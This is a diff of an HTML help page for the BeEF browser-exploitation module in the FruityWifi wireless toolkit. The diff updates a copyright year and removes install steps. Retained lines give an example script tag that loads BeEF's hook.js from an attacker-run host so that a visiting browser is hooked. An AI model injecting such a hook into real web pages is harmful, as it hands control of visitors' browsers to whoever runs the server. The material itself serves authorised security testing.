@@ -1,4 +1,4 @@
-Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
+Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
 <br>
 Browser Exploitation Framework (BeEF) - http://beefproject.com
 <br><br>
@@ -12,16 +12,5 @@ Amid growing concerns about web-borne attacks against clients, including mobile 
 <font face="monospace">http://{FruityWifi-IP}:3000/hook.js</font>
 <br><br>
 <b>Example</b>: <font face="monospace">&lt;script src=&quot;http://10.0.0.1:3000/hook.js&quot;&gt;&lt;/script&gt;</font>
-<br>
-<br>
-<b>BeEF Install</b>:
-<font face="monospace">
-<br>cd /usr/share/fruitywifi/www/modules/beef/includes
-<br>chmod 755 install.sh
-<br>./install.sh
-</font>
-<br><br>
-<b>Note</b>: If you use the installation script (install.sh) on Kali Linux or NetHunter, it will install a newest version but it will break BeEF as a service (native version).
-So, after using the script, you need to disable "Kali-Linux | NetHunter" on the option tab.
 <br>
 
